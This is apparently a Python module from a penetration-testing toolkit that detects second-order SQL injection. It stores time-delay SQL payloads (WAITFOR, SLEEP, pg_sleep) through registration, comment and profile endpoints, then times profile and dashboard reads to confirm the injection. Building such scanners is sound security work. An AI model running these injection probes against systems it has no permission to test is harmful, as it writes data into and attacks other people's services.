"""Second-Order SQL Injection Tester — Sprint 20 P3.

Second-order SQLi: the payload is stored in the DB (no immediate error),
then executed when a different endpoint retrieves that data.

Detection approach:
  1. Inject a time-delay payload into a "write" endpoint (register, comment, profile)
  2. Trigger the "read" endpoint that fetches the stored data
  3. Measure if the read triggers a time delay → confirms second-order SQLi

References:
  - PortSwigger: Second-order SQL injection
  - OWASP Testing Guide: OTG-INPVAL-005

Usage:
    from pentra_tools.vuln.second_order_sqli import test_second_order_sqli

    findings = await test_second_order_sqli(
        base_url="https://target.com",
        write_endpoints=[{"url": "/register", "method": "POST", "param": "username"}],
        read_endpoints=["/profile", "/user/me"],
    )
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass
from urllib.parse import urljoin

import httpx

logger = logging.getLogger(__name__)

# MSSQL time-based payload — truncated to not break username fields
_SQLI_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR time-based"),
    ("' OR SLEEP(5)--", "MySQL SLEEP time-based"),
    ("' OR pg_sleep(5)--", "PostgreSQL pg_sleep time-based"),
    ("1'; WAITFOR DELAY '0:0:5'--", "MSSQL numeric WAITFOR"),
]

# Common write endpoints to inject into
_DEFAULT_WRITE_PATTERNS = [
    {"path": "/register", "method": "POST",
     "fields": {"username": "", "password": "Test@2026!", "email": "test@smoke.local"},
     "inject_param": "username"},
    {"path": "/signup", "method": "POST",
     "fields": {"username": "", "password": "Test@2026!", "email": "test@smoke.local"},
     "inject_param": "username"},
    {"path": "/comment", "method": "POST",
     "fields": {"body": "", "text": ""},
     "inject_param": "body"},
    {"path": "/feedback", "method": "POST",
     "fields": {"message": "", "name": ""},
     "inject_param": "message"},
    {"path": "/profile/update", "method": "POST",
     "fields": {"display_name": "", "bio": ""},
     "inject_param": "display_name"},
]

# Common read endpoints that retrieve stored data
_DEFAULT_READ_PATTERNS = [
    "/profile", "/user/profile", "/me", "/api/me", "/api/user",
    "/dashboard", "/account", "/settings",
]


@dataclass
class SecondOrderFinding:
    title: str
    severity: str = "high"
    write_endpoint: str = ""
    read_endpoint: str = ""
    payload: str = ""
    technique: str = ""
    evidence: str = ""
    vuln_class: str = "SECOND_ORDER_SQLI"

    def to_finding(self) -> dict:
        return {
            "title": self.title,
            "severity": self.severity,
            "vuln_class": self.vuln_class,
            "target_url": self.read_endpoint,
            "description": (
                f"Second-order SQL injection confirmed. "
                f"Payload injected at: {self.write_endpoint} (param: stored in DB). "
                f"Trigger read at: {self.read_endpoint} caused {self.evidence}. "
                "The SQL payload is stored in the database and executed when retrieved."
            ),
            "request_raw": f"WRITE: POST {self.write_endpoint}\nPayload: {self.payload}\n"
                           f"READ: GET {self.read_endpoint}",
            "response_raw": self.evidence,
            "source": "second_order_sqli_tester",
            "remediation": (
                "Use parameterized queries for ALL database operations including SELECT. "
                "Never trust data retrieved from the database — it may contain stored payloads. "
                "Validate data on both write (input) and read (retrieval) paths."
            ),
        }


async def run_second_order_sqli_test(
    base_url: str,
    write_endpoints: list[dict] | None = None,
    read_endpoints: list[str] | None = None,
    auth_headers: dict | None = None,
    proxy_url: str | None = None,
    scope_check_fn=None,
) -> list[dict]:
    """Test for second-order SQL injection vulnerabilities.

    Args:
        base_url:        Target base URL.
        write_endpoints: Custom write endpoint specs. Defaults to common patterns.
        read_endpoints:  Custom read endpoint URLs. Defaults to common patterns.
        auth_headers:    Optional auth headers (needed for profile/dashboard).
        proxy_url:       Optional HTTP proxy.
        scope_check_fn:  Optional scope enforcer.

    Returns:
        List of finding dicts.
    """
    if scope_check_fn and not scope_check_fn(base_url):
        return []

    base = base_url.rstrip("/")
    headers = {"Content-Type": "application/x-www-form-urlencoded", **(auth_headers or {})}
    proxy = proxy_url if proxy_url else None
    findings: list[dict] = []

    write_eps = write_endpoints or _DEFAULT_WRITE_PATTERNS
    read_eps = read_endpoints or [base + p for p in _DEFAULT_READ_PATTERNS]

    async with httpx.AsyncClient(
        verify=False,  # noqa: S501
        follow_redirects=True,
        timeout=20.0,
        **({"proxy": proxy} if proxy else {}),
    ) as client:

        for write_ep in write_eps[:4]:  # cap at 4 write endpoints
            write_url = urljoin(base + "/", write_ep["path"].lstrip("/"))
            inject_param = write_ep.get("inject_param", "username")
            base_fields = dict(write_ep.get("fields", {}))

            for payload, technique in _SQLI_PAYLOADS[:2]:  # test 2 payloads per endpoint
                # Step 1: Inject payload into write endpoint
                payload_short = payload[:30]  # username fields often have max length
                inject_fields = {
                    **base_fields,
                    inject_param: payload_short,
                }

                try:
                    write_resp = await client.post(
                        write_url,
                        data=inject_fields,
                        headers=headers,
                    )
                    logger.debug(
                        "[2nd_order_sqli] Injected into %s[%s] status=%d",
                        write_url, inject_param, write_resp.status_code,
                    )
                except Exception as exc:
                    logger.debug("[2nd_order_sqli] Write failed: %s", exc)
                    continue

                # Small delay to let the injection settle
                await asyncio.sleep(0.5)

                # Step 2: Trigger read endpoints and measure timing
                for read_url in read_eps[:4]:
                    try:
                        t0 = time.monotonic()
                        read_resp = await client.get(
                            read_url,
                            headers=dict(auth_headers or {}),
                        )
                        elapsed = time.monotonic() - t0

                        # Time-based confirmation: ≥4.5s indicates SLEEP/WAITFOR fired
                        if elapsed >= 4.5:
                            logger.info(
                                "[2nd_order_sqli] CONFIRMED: write=%s read=%s elapsed=%.1fs",
                                write_url, read_url, elapsed,
                            )
                            f = SecondOrderFinding(
                                title=f"Second-Order SQL Injection — {write_ep['path']}[{inject_param}]",
                                severity="high",
                                write_endpoint=write_url,
                                read_endpoint=read_url,
                                payload=payload,
                                technique=technique,
                                evidence=f"Read endpoint {read_url} took {elapsed:.1f}s after injecting '{payload_short}' at {write_url}",
                            )
                            findings.append(f.to_finding())
                            break  # one confirmation per write endpoint

                    except httpx.TimeoutException:
                        # Timeout also confirms time-based injection
                        logger.info(
                            "[2nd_order_sqli] TIMEOUT: write=%s read=%s → time-based confirmed",
                            write_url, read_url,
                        )
                        f = SecondOrderFinding(
                            title=f"Second-Order SQL Injection (Timeout) — {write_ep['path']}[{inject_param}]",
                            severity="high",
                            write_endpoint=write_url,
                            read_endpoint=read_url,
                            payload=payload,
                            technique=technique,
                            evidence=f"Request timed out — time-based second-order SQLi confirmed",
                        )
                        findings.append(f.to_finding())
                        break
                    except Exception as exc:
                        logger.debug("[2nd_order_sqli] Read failed: %s", exc)
                        continue

                if findings:
                    break  # one finding per write endpoint is enough

    if findings:
        logger.info("[2nd_order_sqli] %d second-order finding(s)", len(findings))
    return findings
